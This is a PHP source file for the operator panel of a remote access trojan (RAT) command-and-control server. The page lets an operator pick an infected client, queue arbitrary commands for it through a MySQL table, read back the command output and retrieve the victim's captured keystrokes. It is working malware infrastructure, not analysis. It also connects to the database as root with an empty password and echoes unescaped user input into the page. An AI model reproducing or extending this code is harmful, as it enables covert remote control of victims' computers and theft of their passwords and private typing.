<?php  
	if(isset($_GET['client']) && !empty($_GET['client'])){
		$client =  $_GET['client'] ;
	}
	elseif (isset($_POST['client']) && !empty($_POST['client'])){
		$client = $_POST['client'];
	}
	else{
		$client = 'no client';
	}			
			
?>
		

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Control Server</title>
  <style>
    body{
      font-family: Arial, Helvetica, sans-serif;
      text-align: center;
      background-color:  #87ceeb ;
      padding: 20px;
     
    }
    button{
		padding: 10px;
	}
	
   
  </style>
</head>
<body>
  <div id="command-form">
      <img src="serverIcon.png" alt="" width="180vw">
      <h2>Client RAT Administration Page</h2>
   	  <form method="post" action="openClient.php" id="cmdform"> 
	    
		RAT Client Name: <input type="text" name="client" readonly value="<?php echo $client ?>"/>
		<p>Please enter your command: </p>
		<input type="text" name="cmdstr" size="35%">
		<p><input type="submit" name="buttonExecute"  value="Execute"></p>
		
		
		<p><input type="submit" name="buttonGetResult"  value="Get Return String"></p>
		<p><input type="submit" name="buttonGetKeylog"  value="Get Keylog"></p>
		<p><a href='index.php'>Back to Main</a></p>
	  </form> 
  </div>
	
</body>
</html>


<?php
	
	if(isset($_POST['buttonExecute'])){
		$db = new mysqli('localhost', 'root','', 'control_server');
		if(mysqli_connect_errno()) exit;
		
		if(isset($_POST['cmdstr']) && !empty($_POST['cmdstr'])){
			
			$cmdstr = $_POST['cmdstr'];
			echo 'Received: '.$cmdstr.'<br>';
			$query="UPDATE clients SET cmd=? WHERE name=?";
			$stmt = $db->prepare($query);
			$stmt->bind_param('ss',$cmdstr,$client); //i(integer),s(string),d(double),b(blob)
			$stmt->execute();
		
			$db->close();
		}
		  
		
		
	}
	elseif(isset($_POST['buttonGetResult'])){
		$db = new mysqli('localhost', 'root','', 'control_server');
		if(mysqli_connect_errno()) exit;
		
		$query = "SELECT retstr FROM clients WHERE name=?";
		$stmt = $db->prepare($query);
		$stmt->bind_param('s',$client);
		$stmt->execute();
		$stmt->store_result();
		$stmt->bind_result($retStr);
		$stmt->fetch();
		echo "<textarea rows='20' cols='60'>";
		echo $retStr;
		echo "</textarea>";
		$db->close();
		
	}
	elseif(isset($_POST['buttonGetKeylog'])){
		$db = new mysqli('localhost', 'root','', 'control_server');
		if(mysqli_connect_errno()) exit;
		
		$query = "SELECT keylog FROM clients WHERE name=?";
		$stmt = $db->prepare($query);
		$stmt->bind_param('s',$client);
		$stmt->execute();
		$stmt->store_result();
		$stmt->bind_result($keylog);
		$stmt->fetch();
		echo "<textarea rows='20' cols='60'>";
		echo $keylog;
		echo "</textarea>";
		$db->close();
		
	}
?>